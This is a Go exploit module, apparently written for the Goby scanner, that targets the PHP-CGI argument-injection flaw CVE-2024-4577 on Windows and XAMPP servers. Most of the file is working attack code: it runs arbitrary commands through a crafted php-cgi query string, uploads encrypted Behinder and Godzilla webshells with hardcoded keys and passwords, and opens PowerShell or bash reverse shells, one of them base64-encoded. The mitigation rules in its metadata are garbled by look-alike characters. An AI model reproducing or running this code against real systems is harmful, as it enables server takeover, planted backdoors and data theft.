package exploits

import (
	"encoding/base64"
	"errors"
	"net/url"
	"strings"
	"time"
	"unicode/utf16"

	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "XAMPP PHP-CGI  Windows Code Execution Vulnerability",
    "Description": "<p>PHP is a scripting language executed on the server side. There was a command execution vulnerability before version 8.3.8 of PHP. Due to the \"Best-Fit Mapping\" feature of Windows, non-ASCII characters may be incorrectly mapped to dash (-) when processing query strings, resulting in command line parameter parsing errors. When php_cgi runs on the Windows platform and the code page is in traditional Chinese, simplified Chinese or Japanese, the attacker can inject malicious parameters through a specific query string to execute arbitrary code.</p>",
    "Product": "php-CGI",
    "Homepage": "https://www.php.net/",
    "DisclosureDate": "2024-06-07",
    "PostTime": "2024-06-12",
    "Author": "Town",
    "FofaQuery": "header=\"Xampps_info\" || banner=\"Xampps_info\" || body=\"/xampps.jpg\" || (header=\"location http\" && header=\"xampp\") || body=\"content=\\\"Kai Oswald Seidler\" || title=\"XAMPP for\" || title=\"XAMPP Version\" || body=\"font-size: 1.2em; color: red;\\\">New XAMPP\" || header=\"xampp user\" || title=\"Welcome to XAMPP\" || body=\"content=\\\"XAMPP \" || (header=\"Server: Apache\" && header=\"Win64\" && header=\"PHP/\")",
    "GobyQuery": "header=\"Xampps_info\" || banner=\"Xampps_info\" || body=\"/xampps.jpg\" || (header=\"location http\" && header=\"xampp\") || body=\"content=\\\"Kai Oswald Seidler\" || title=\"XAMPP for\" || title=\"XAMPP Version\" || body=\"font-size: 1.2em; color: red;\\\">New XAMPP\" || header=\"xampp user\" || title=\"Welcome to XAMPP\" || body=\"content=\\\"XAMPP \" || (header=\"Server: Apache\" && header=\"Win64\" && header=\"PHP/\")",
    "Level": "3",
    "Impact": "<p>The attacker can inject malicious parameters through a specific query string to execute arbitrary code to take over the server.</p>",
    "Recommendation": "<p>1. Update to the latest PHP version officially released by PHP: <a href=\"https://www.php.net/downloads\">https://www.php.net/downloads</a>2. For users who cannot upgrade PHP: the following rewrite rules can be used to prevent attacks. It should be noted that these rules only temporarily alleviate the traditional Chinese, simplified Chinese and Japanese language environments. In practice, it is still recommended to update to the patch version or migrate the architecture. RеԝritеEnɡｉnе OnRеԝritеCоd %{QUERY_STRING} ^%аd [NC]RеԝritеRulе .? - [F,L]3. For users who use XAMPP fоr Windоԝѕ: If you confirm that you don't need PHP CGI function, you can avoid it by modifying the following Aрасhе HTTP Sеrvеr configuration (httpd-xampp.conf) The impact of the vulnerability:Find the corresponding line: ScriptAlias /php-cgi/ \"C:/xampp/php/\"And comment it off: # ScriptAlias /php-cgi/ \"C:/xampp/php/\"</p>",
    "References": [
        "https://labs.watchtowr.com/no-way-php-strikes-again-cve-2024-4577/"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd,upload,Behinder,reverse",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "attackType=cmd"
        },
        {
            "name": "reverse",
            "type": "select",
            "value": "ByPowershellBase64,ByPowershell",
            "show": "attackType=reverse"
        },
        {
            "name": "fileContent",
            "type": "input",
            "value": "<?php phpinfo(); ?>",
            "show": "attackType=upload"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Code Execution"
    ],
    "VulType": [
        "Code Execution"
    ],
    "CVEIDs": [
        "CVE-2024-4577"
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "XAMPP Windows PHP-CGI 代码执行漏洞",
            "Product": "php-CGI",
            "Description": "<p>PHP是一种在服务器端执行的脚本语言,在 PHP 的 8.3.8 版本之前存在命令执行漏洞,由于 Windows 的 \"Best-Fit Mapping\" 特性,在处理查询字符串时,非ASCII字符可能被错误地映射为破折号（-）,导致命令行参数解析错误,当 php_cgi 运行在Windows平台上，且代码页为繁体中文、简体中文或日文时，攻击者可以通过特定的查询字符串注入恶意参数，从而执行任意代码。<br></p>",
            "Recommendation": "<p>1.更新到PHP官方发布的最新PHP版本：<a href=\"https://www.php.net/downloads\">https://www.php.net/downloads</a>&nbsp;</p><p>2.对于无法升级PHP的用户：以下重写规则可用于阻止攻击。需要注意的是，这些规则仅对繁体中文、简体中文和日语语言环境起到临时缓解作用。在实际操作中，仍然建议更新到补丁版本或迁移架构。<br>RеԝritеEnɡｉnе On<br>RеԝritеCоd %{QUERY_STRING} ^%аd [NC]<br>RеԝritеRulе .? - [F,L]&nbsp;</p><p>3.对于使用 XAMPP fоr Windоԝѕ 的用户：如果确认不需要 PHP CGI 功能，可以通过修改以下 Aрасhе HTTP Sеrvеr 配置（httpd-xampp.conf ）来避免受到该漏洞的影响：&nbsp;<br>找到相应的行：ScriptAlias /php-cgi/ \"C:/xampp/php/\"&nbsp;<br>并将其注释掉：# ScriptAlias /php-cgi/ \"C:/xampp/php/\"<br></p>",
            "Impact": "<p>攻击者可以通过特定的查询字符串注入恶意参数，从而执行任意代码，以至于接管服务器。</p>",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "代码执行"
            ]
        },
        "EN": {
            "Name": "XAMPP PHP-CGI  Windows Code Execution Vulnerability",
            "Product": "php-CGI",
            "Description": "<p>PHP is a scripting language executed on the server side. There was a command execution vulnerability before version 8.3.8 of PHP. Due to the \"Best-Fit Mapping\" feature of Windows, non-ASCII characters may be incorrectly mapped to dash (-) when processing query strings, resulting in command line parameter parsing errors. When php_cgi runs on the Windows platform and the code page is in traditional Chinese, simplified Chinese or Japanese, the attacker can inject malicious parameters through a specific query string to execute arbitrary code.<br></p>",
            "Recommendation": "<p>1. Update to the latest PHP version officially released by PHP: <a href=\"https://www.php.net/downloads\">https://www.php.net/downloads</a><br>2. For users who cannot upgrade PHP: the following rewrite rules can be used to prevent attacks. It should be noted that these rules only temporarily alleviate the traditional Chinese, simplified Chinese and Japanese language environments. In practice, it is still recommended to update to the patch version or migrate the architecture. <br>RеԝritеEnɡｉnе On<br>RеԝritеCоd %{QUERY_STRING} ^%аd [NC]<br>RеԝritеRulе .? - [F,L]<br>3. For users who use XAMPP fоr Windоԝѕ: If you confirm that you don't need PHP CGI function, you can avoid it by modifying the following Aрасhе HTTP Sеrvеr configuration (httpd-xampp.conf) The impact of the vulnerability:<br>Find the corresponding line: ScriptAlias /php-cgi/ \"C:/xampp/php/\"<br>And comment it off: # ScriptAlias /php-cgi/ \"C:/xampp/php/\"<br></p>",
            "Impact": "<p>The attacker can inject malicious parameters through a specific query string to execute arbitrary code to take over the server.<br></p>",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "Code Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "PocId": "10960"
}`

	setpayloadrequest0d92e236d6d24a879402f166ae1f5302 := func(hostInfo *httpclient.FixUrl, mode string, command string) (string, string, error) {
		//command为原始命令，如果需编码，请自行编码后使用
		filename := goutils.RandomHexString(8) + ".php"
		payloadConfig := httpclient.NewPostRequestConfig("/php-cgi/php-cgi.exe?%add+allow_url_include%3don+%add+auto_prepend_file%3dphp%3a//input")
		switch mode {
		case "check":
			payloadConfig.Data = "<?php " + command + "; ?>"
		case "exec":
			payloadConfig.Data = "<?php system(\"" + command + "\"); ?>"
		case "upload":
			command = base64.StdEncoding.EncodeToString([]byte(command))
			payloadConfig.Data = "<?php file_put_contents($_SERVER['DOCUMENT_ROOT'].\"/\".\"" + filename + "\", base64_decode(\"" + command + "\")); ?>"
		}

		payloadConfig.VerifyTls = false
		payloadConfig.FollowRedirect = false
		payloadConfig.Header.Store("REDIRECT-STATUS", "XCANWIN")
		resp, err := httpclient.DoHttpRequest(hostInfo, payloadConfig)
		if err != nil {
			return "", "", err
		}
		//漏洞url地址
		url := "/"

		//命令执行的结果，如果结果是编码的，请自己解码后返回，如果返回为空的字符串，则判断命令执行失败

		commandResult := strings.Split(resp.RawBody, "\x4d\x5a\x90\x00\x03\x00")[0]

		if mode == "upload" {
			commandResult = hostInfo.FixedHostInfo + "/" + filename
		}

		return commandResult, url, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		//poc验证函数
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			//setPayloadRequestHash函数会赋值给runPayload，请自行重命名setPayloadRequestHash函数
			runPayload := setpayloadrequest0d92e236d6d24a879402f166ae1f5302

			text := goutils.RandomHexString(16)
			pocCommand := `echo "` + text + `"`
			pocRuselt, pocUrl, err := runPayload(hostInfo, "check", pocCommand)
			if err != nil {
				return false
			}
			if strings.Contains(pocRuselt, text) {
				ss.VulURL = hostInfo.FixedHostInfo + pocUrl
				return true
			}
			return false
		},
		//exp利用函数
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			//setPayloadRequestHash函数会赋值给runPayload，请自行重命名setPayloadRequestHash函数
			runPayload := setpayloadrequest0d92e236d6d24a879402f166ae1f5302

			setReverseWaitting := func(expResult *jsonvul.ExploitResult, waitSessionCh chan string) {
				select {
				case webConsleID := <-waitSessionCh:
					if u, err := url.Parse(webConsleID); err == nil {
						expResult.Success = true
						expResult.OutputType = "html"
						sid := strings.Join(u.Query()["id"], "")
						expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
					} else {
						expResult.Success = false
						expResult.Output = "reverse shell fail"
					}
				case <-time.After(time.Second * 25):
				}
			}

			setReverseRequest := func(reverseType string) (string, chan string, error) {
				typeList := map[string]func(string) string{
					"ByBash":             godclient.ReverseTCPByBash,
					"ByBashBase64":       godclient.ReverseTCPByBash,
					"ByPowershell":       godclient.ReverseTCPByPowershell,
					"ByPowershellBase64": godclient.ReverseTCPByPowershell,
					"BySh":               godclient.ReverseTCPBySh,
					"ByNcBsd":            godclient.ReverseTCPByNcBsd,
				}
				if revserTypeNew := typeList[reverseType]; revserTypeNew == nil {
					return "", nil, errors.New("vaild exsploit")
				}
				waitSessionCh := make(chan string)

				if strings.Contains(reverseType, "ByPowershell") {
					if rp, err := godclient.WaitSession("reverse_windows", waitSessionCh); err != nil || len(rp) >= 0 {
						command := typeList[reverseType](rp)
						if reverseType == "ByPowershellBase64" {
							utf16Bytes := utf16.Encode([]rune(strings.TrimLeft(command, "powershell ")))
							bytes := make([]byte, len(utf16Bytes)*2)
							for i, v := range utf16Bytes {
								bytes[i*2] = byte(v)
								bytes[i*2+1] = byte(v >> 8)
							}
							command = "powershell -e " + base64.StdEncoding.EncodeToString(bytes)
						}
						return command, waitSessionCh, nil
					}
				} else {
					if rp, err := godclient.WaitSession("reverse_linux_none", waitSessionCh); err != nil || len(rp) >= 0 {
						command := typeList[reverseType](rp)
						if reverseType == "ByBashBase64" {
							command = "bash -c '{echo," + base64.StdEncoding.EncodeToString([]byte(command)) + "}|{base64,-d}|{bash,-i}'"
						}
						return command, waitSessionCh, nil
					}
				}
				return "", waitSessionCh, errors.New("gain command fail")
			}

			attackType := goutils.B2S(ss.Params["attackType"])
			switch attackType {
			case "cmd":
				//配置命令
				command := goutils.B2S(ss.Params["cmd"])
				Result, _, err := runPayload(expResult.HostInfo, "exec", command)

				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
					return expResult
				}

				if len(Result) > 0 {
					expResult.Success = true
					expResult.Output = Result
				} else {
					expResult.Success = false
					expResult.Output = err.Error()
				}
			case "upload":
				//配置反弹shell的类型
				fileContent := goutils.B2S(ss.Params["fileContent"])
				Result, _, err := runPayload(expResult.HostInfo, "upload", fileContent)
				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
					return expResult
				}

				if len(Result) > 0 {
					expResult.Success = true
					expResult.Output = "访问地址:" + Result
				} else {
					expResult.Success = false
					expResult.Output = err.Error()
				}
			case "Behinder":
				//配置反弹shell的类型
				fileContent := `<?php @error_reporting(0);session_start();$key="e45e329feb5d925b";$_SESSION['k']=$key;session_write_close();$post=file_get_contents("php://input");if(!extension_loaded('openssl')){$t="base64_"."decode";$post=$t($post."");for($i=0;$i<strlen($post);$i++){$post[$i]=$post[$i]^$key[$i+1&15];}}else{$post=openssl_decrypt($post,"AES128",$key);} $arr=explode('|',$post);$func=$arr[0];$params=$arr[1];class C{public function __invoke($p){eval($p."");}};@call_user_func(new C(),$params);?>`
				Result, _, err := runPayload(expResult.HostInfo, "upload", fileContent)
				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
					return expResult
				}

				if len(Result) > 0 {
					expResult.Success = true
					expResult.Output += "WebShell URL: " + Result + "\n"
					expResult.Output += "Password: rebeyond \nWebShell tool: Behinder \n"
				} else {
					expResult.Success = false
					expResult.Output = err.Error()
				}
			case "Godzilla":
				//配置反弹shell的类型
				fileContent := `<?php @session_start();@set_time_limit(0);@error_reporting(0);function encode($D,$K){for($i=0;$i<strlen($D);$i++){$c=$K[$i+1&15];$D[$i]=$D[$i]^$c;}return$D;}$p='pass';$n='payload';$k='3c6e0b8a9c15224a';if(isset($_POST[$p])){$d=encode(base64_decode($_POST[$p]),$k);if(isset($_SESSION[$n])){$p=encode($_SESSION[$n],$k);if(strpos($p,"getBasicsInfo")===false){$p=encode($p,$k);}eval($p);echo substr(md5($p.$k),0,16);echo base64_encode(encode(@run($d),$k));echo substr(md5($p.$k),16);}else{if(strpos($d,"getBasicsInfo")!==false){$_SESSION[$n]=encode($d,$k);}}}?>`
				Result, _, err := runPayload(expResult.HostInfo, "upload", fileContent)
				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
					return expResult
				}

				if len(Result) > 0 {
					expResult.Success = true
					expResult.Output += "WebShell URL: " + Result + "\n"
					expResult.Output += `密码：pass  向量：key  加密器：PHP_XOR_BASE64`
				} else {
					expResult.Success = false
					expResult.Output = err.Error()
				}
			case "reverse":
				//配置反弹shell的类型
				reversetype := goutils.B2S(ss.Params["reverse"])

				if command, waitSessionCh, err := setReverseRequest(reversetype); command != "" {
					go runPayload(expResult.HostInfo, "exec", command)
					setReverseWaitting(expResult, waitSessionCh)
				} else {
					expResult.Success = false
					expResult.Output = err.Error()
				}
			default:
				expResult.Success = false
				expResult.Output = `未知的利用方式`
			}
			return expResult
		},
	))
}
